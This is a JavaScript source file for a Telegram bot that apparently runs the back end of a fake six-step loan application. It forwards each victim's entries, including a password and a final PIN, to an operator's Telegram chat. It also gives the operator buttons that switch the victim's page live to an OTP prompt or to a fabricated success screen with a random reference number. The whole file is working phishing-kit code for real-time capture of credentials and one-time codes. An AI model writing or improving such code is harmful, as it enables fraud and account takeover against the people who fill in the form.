/**
 * bot_manager.js
 * Updated for 6-Step Flow
 * Admin Gates: Step 4 (Password) & Step 6 (PIN)
 */

require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
    console.error("❌ Missing BOT_TOKEN or ADMIN_CHAT_ID");
    process.exit(1);
}

// polling: false because server.js handles webhook POSTs
const bot = new TelegramBot(BOT_TOKEN, { polling: false });

// --- UTILITIES ---
const escapeHTML = (str) => {
    if (!str) return "N/A";
    return String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
};

const send = (message, options = {}) => {
    return bot.sendMessage(ADMIN_CHAT_ID, message, {
        parse_mode: "HTML",
        ...options
    }).catch(err => console.error("Telegram Error:", err.message));
};

// --- STEP SENDERS ---

const sendToAdmin = (appId, title, data, needsApproval = false) => {
    let msg = `📝 <b>${title}</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>${appId}</code>\n`;
    
    for (const [key, value] of Object.entries(data)) {
        msg += `<b>${key}:</b> <code>${escapeHTML(value)}</code>\n`;
    }

    if (needsApproval) {
        // Step 4 Approval: Move user to OTP input
        send(msg + "\n⚠️ <b>Wait for Admin to show OTP input?</b>", {
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ SHOW OTP INPUT", callback_data: `approve_step4_${appId}` }
                ]]
            }
        });
    } else {
        send(msg);
    }
};

const sendFinalApproval = (appId, pin) => {
    const msg = `🏁 <b>STEP 6 – FINAL PIN RECEIVED</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>${appId}</code>\n🔐 <b>PIN:</b> <code>${pin}</code>\n\n<b>Review all data. Click below to complete the loan.</b>`;
    
    send(msg, {
        reply_markup: {
            inline_keyboard: [[
                { text: "✅ COMPLETE & SUCCESS", callback_data: `approve_step6_${appId}` },
                { text: "❌ REJECT", callback_data: `reject_${appId}` }
            ]]
        }
    });
};

// --- CALLBACK HANDLER (The "Brain") ---

bot.on("callback_query", async (query) => {
    const { data, id, message } = query;
    const parts = data.split("_"); // approve | step4 | appId
    const action = parts[0];
    const targetStep = parts[1];
    const appId = parts[2];

    await bot.answerCallbackQuery(id);

    const io = global.io;
    if (!io) return console.error("Socket.io instance missing");

    // Handle Step 4 Approval (Password -> OTP)
    if (data.startsWith("approve_step4")) {
        io.to(appId).emit("password-verified"); // Matches index.html listener
        
        bot.editMessageText(message.text + "\n\n✅ <b>APPROVED: User moved to OTP Step.</b>", {
            chat_id: ADMIN_CHAT_ID,
            message_id: message.message_id,
            parse_mode: "HTML"
        });
    }

    // Handle Step 6 Approval (PIN -> Success Screen)
    if (data.startsWith("approve_step6")) {
        const referenceId = "ASA-" + Math.floor(Math.random() * 900000 + 100000);
        
        io.to(appId).emit("pin-verified", { referenceId }); // Matches index.html listener
        
        bot.editMessageText(message.text + `\n\n✅ <b>COMPLETED: Success screen shown.</b>\nRef: ${referenceId}`, {
            chat_id: ADMIN_CHAT_ID,
            message_id: message.message_id,
            parse_mode: "HTML"
        });
    }

    // Handle Rejection
    if (action === "reject") {
        bot.editMessageText(message.text + "\n\n❌ <b>REJECTED</b>", {
            chat_id: ADMIN_CHAT_ID,
            message_id: message.message_id,
            parse_mode: "HTML"
        });
    }
});

module.exports = {
    bot,
    sendToAdmin,
    sendFinalApproval
};